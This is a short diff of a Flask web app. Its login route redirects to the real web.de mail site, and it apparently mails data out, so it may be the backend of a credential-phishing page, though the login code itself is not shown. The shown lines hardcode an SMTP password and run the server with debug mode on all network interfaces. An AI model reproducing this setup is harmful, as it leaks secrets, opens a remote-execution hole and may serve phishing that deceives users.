@@ -5,7 +5,6 @@ import logging
 # Configure logging
 logging.basicConfig(level=logging.DEBUG)
 
-
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'your_secret_key_here'
 
@@ -18,11 +17,9 @@ app.config['MAIL_PASSWORD'] = 'htnszupvzzssqxwx'  # Your Gmail password or App P
 
 mail = Mail(app)
 
-
 @app.route('/')
 def index():
     return render_template('index.html')
-
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -40,6 +37,6 @@ def login():
 
     return redirect('https://web.de/')
 
-
 if __name__ == '__main__':
-    app.run(debug=True)
+    # Only run the app if this script is executed directly
+    app.run(host='0.0.0.0', port=8080, debug=True)
